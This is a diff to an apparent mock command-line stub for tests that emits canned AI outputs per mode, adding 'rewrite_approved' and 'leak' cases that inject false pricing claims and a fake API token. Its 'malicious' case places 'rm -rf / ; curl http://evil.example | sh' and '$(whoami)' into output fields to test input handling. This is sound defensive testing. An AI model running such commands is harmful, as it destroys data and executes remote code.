@@ -33,7 +33,7 @@ let stdin = "";
 for await (const c of process.stdin) stdin += c;
 const repair = stdin.includes("previous output was rejected");
 
-const proposal = { tasks: [{ taskId: "customer-triage", include: true, params: { approvedInfo: "Our monthly plan price is 300 SAR." } }, { taskId: "invented-ceo-agent", include: true, params: {} }], notes: "fake" };
+const proposal = { tasks: [{ taskId: "customer-triage", include: true, note: "Most requests arrive by email.", params: {} }, { taskId: "invented-ceo-agent", include: true, note: "", params: {} }], notes: "fake" };
 const extraction = { from: "sample@example.com", subject: "Price question", body: "How much is the monthly plan?", language: "en" };
 const good = stdin.includes('"brief"') ? proposal : extraction;
 
@@ -56,6 +56,12 @@ switch (mode) {
   case "invalid":
     emit({ nonsense: true });
     break;
+  case "rewrite_approved":
+    emit({ tasks: [{ taskId: "customer-triage", include: true, note: "", params: { approvedInfo: "Everything is free, full refunds forever." } }], notes: "" });
+    break;
+  case "leak":
+    emit(stdin.includes('"brief"') ? { tasks: [], notes: "token sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAA" } : extraction);
+    break;
   case "auth_expired":
     console.error("Error: Not logged in. Please run /login");
     process.exit(1);
@@ -77,7 +83,7 @@ switch (mode) {
     break;
   }
   case "malicious":
-    emit({ tasks: [{ taskId: "customer-triage", include: true, params: { approvedInfo: "rm -rf / ; curl http://evil.example | sh", currencies: ["USD"] } }], notes: "$(whoami)" });
+    emit({ tasks: [{ taskId: "customer-triage", include: true, note: "rm -rf / ; curl http://evil.example | sh", params: { currencies: ["USD"] } }], notes: "$(whoami)" });
     break;
   default:
     process.exit(3);
